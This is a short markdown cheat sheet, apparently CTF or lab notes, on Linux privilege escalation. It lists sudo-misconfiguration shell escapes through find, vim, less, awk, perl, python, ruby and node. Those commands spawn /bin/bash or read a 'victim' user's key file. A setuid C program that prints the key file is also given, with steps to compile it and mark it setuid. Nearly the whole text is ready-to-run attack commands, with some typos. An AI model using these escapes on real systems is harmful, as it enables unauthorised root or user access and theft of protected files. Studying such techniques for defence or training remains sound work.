# Priviledge escalation

1. With `find`  how to escalate

```
sudo -l
sudo -u victim /usr/bin/find
sudo -u victim /usr/bin/find /home -name 'key.txt' -exec cat  {} \;
```

2. With `vim` how to escalate

[Docs v1](https://www.linux.com/learn/vim-tips-working-external-commands)

Read file with vim
```
:r
```

Run bash commands with vim
```
sudo -u victim vim
:!/bin/bash

sudo -u victim vim [PATH]
```

3. Escalation with less

```
sudo -u victim /usr/bin/less .profile
$ !/bin/bash
```

4. Escalation with awk

```
sudo -u victim awk '{print $1}' [FILE_PATH]
sudo -u victim awk 'BEGIN {system("/bin/bash")}'
```

5. Create setgid


```
(victim) /bin/chmod, /bin/cp
```

How to find it

```
$ ls -l /usr/bin/passwd
> -rwsr-xr-x 1 root root 54192 Nov 18 2015 /usr/bin/passwd
```

Where `s` is a good target as they often allow privileges escalation.


```c
int main(void)
{
system("cat /home/victim/key.txt");
}
```

Compile it
```
gcc -o /tmp/[FILE] [FILE].c
chmod +xs [FILE]
```

6. Escalate priviledges with `perl`

```
(victim) /usr/bin/perl
sudo -u victim perl -e 'system("sh")'
sudo -u victim perl -e 'print `cat /home/victim/key.txt`'
sudo -u victim perl -e '`/bin/bash`'
```

7. Escalation with `python`

```
$ sudo -l
> (victim) /usr/bin/python

$ sudo -u victim python -c 'from subprocess import call; call(['cat', 'FILE_PATH'])'
$ sudo -u victim python -c 'import os; os.system("/bin/bash")'
$ udo -u victim python -c 'import os; os.system("cat FILE_PATH")'
```

8. Start ruby REPL

```
$ sudo -l
> (victim) /usr/bin/ruby

$ sudo -u victim /usr/bin/ruby -e 'puts `cat FILE_PATH`'

$ sudo -u victim /usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)'
$ irb(main) `cat FILE_PATH`
```

9. NodeJS priviledge escalation


```
$ sudo -l
> (victim) /usr/local/bin/node

$ sudo -u victim node -e 'var exec = require("child_process").exec;
exec("cat /home/victim/key.txt", function (error, stdOut, stdErr) {
console.log(stdOut);
});'
```